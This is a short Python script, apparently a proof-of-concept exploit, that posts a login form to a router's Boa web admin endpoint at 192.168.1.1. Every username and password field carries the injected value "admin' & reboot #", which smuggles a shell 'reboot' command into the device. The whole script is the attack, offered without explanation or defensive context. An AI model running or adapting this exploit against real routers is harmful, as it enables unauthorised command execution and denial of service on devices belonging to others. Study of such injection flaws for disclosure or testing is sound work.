import requests

url = "http://192.168.1.1/boaform/admin/formLogin"

payload = {
    "username1": "admin' & reboot #",
    "psd1": "admin' & reboot #",
    "verification_code": "qc5z8",
    "username": "admin' & reboot #",
    "psd": "admin' & reboot #",
    "sec_lang": "0",
    "loginSelinit": "",
    "ismobile": "",
    "csrftoken": "00a8baa9b6ffdwada0b54a194f9233f35eceb",
}

headers = {
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer": "http://192.168.1.1/admin/login.asp",
    "Origin": "http://192.168.1.1",
}

response = requests.post(url, data=payload, headers=headers)

print("Status:", response.status_code)
print(response.text)
